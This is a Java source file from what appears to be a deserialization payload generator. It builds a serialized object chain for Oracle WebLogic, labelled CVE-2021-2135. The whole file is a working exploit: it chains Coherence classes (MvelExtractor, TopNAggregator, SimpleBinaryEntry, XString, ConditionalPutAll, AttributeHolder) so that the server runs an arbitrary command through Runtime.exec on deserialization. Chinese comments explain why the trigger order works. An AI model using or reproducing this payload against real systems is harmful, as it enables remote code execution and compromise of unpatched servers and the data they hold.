package payloads;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.internal.util.SimpleBinaryEntry;
import com.tangosol.io.DefaultSerializer;
import com.tangosol.io.Serializer;
import com.tangosol.util.*;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.filter.MapEventFilter;
import com.tangosol.util.processor.ConditionalPutAll;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import common.Serializerable;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;


// CVE-2021-2135

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"weblogic:12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0"})
@Authors({ Authors.CCKUAILONG })
public class Weblogic10 implements ObjectPayload<Object> {

	public byte[] getObject(final String command) throws Exception {
		// 生成一个Name对象
		MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+ command +"\");return new Integer(1);");
		MvelExtractor extractor2 = new MvelExtractor("");

		// 序列化入口
		AttributeHolder attributeHolder = new AttributeHolder();

		SortedBag partialResult = new TopNAggregator.PartialResult(extractor2, 2);
		partialResult.add(1);
		filedSet("m_comparator",partialResult, extractor1);

		// 这里bin_Key必须用ExternalizableHelper.writeObject赋值，不能用partialResult.writeExternal(dataOutputStream1);
		// 因为使用partialResult.writeExternal最终不会调用partialResult.readExternal，只会写m_comparator，不写partialResult自身
		ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
		DataOutputStream dataOutputStream1 = new DataOutputStream(baos1);
		ExternalizableHelper.writeObject(dataOutputStream1, partialResult);

		ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
		DataOutputStream dataOutputStream2 = new DataOutputStream(baos2);
		ExternalizableHelper.writeObject(dataOutputStream2, new Integer(0));

		Binary key = new Binary(baos1);
		Binary value = new Binary(baos2);
		SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(key,value);
		Serializer m_serializer= new DefaultSerializer(SimpleBinaryEntry.class.getClassLoader());
		simpleBinaryEntry.setContextSerializer(m_serializer);

		// 调用xString.equals(simpleBinaryEntry)可触发SimpleBinaryEntry#toString，所以map按顺序先加入simpleBinaryEntry，再加入xString

		LiteMap liteMap = new LiteMap();
		liteMap.put(simpleBinaryEntry,1);
		liteMap.put(new XString(null),2);
		ConditionalPutAll conditionalPutAll = new ConditionalPutAll(new MapEventFilter(), liteMap);

		// 序列化入口
//        AttributeHolder attributeHolder = new AttributeHolder();
		Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
		setInternalValue.setAccessible(true);
		setInternalValue.invoke(attributeHolder, conditionalPutAll); //调用setInternalValue方法设置m_oValue属性为conditionalPutAll

		return Serializerable.serialize(attributeHolder);
	}

	private static void filedSet(String fieldName, Object target, Object fieldValue) throws NoSuchFieldException, IllegalAccessException {
		Field field = target.getClass().getSuperclass().getDeclaredField(fieldName);
		field.setAccessible(true);
		field.set(target, fieldValue);
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return Weblogic10.class.newInstance().getObject(command);
	}

}
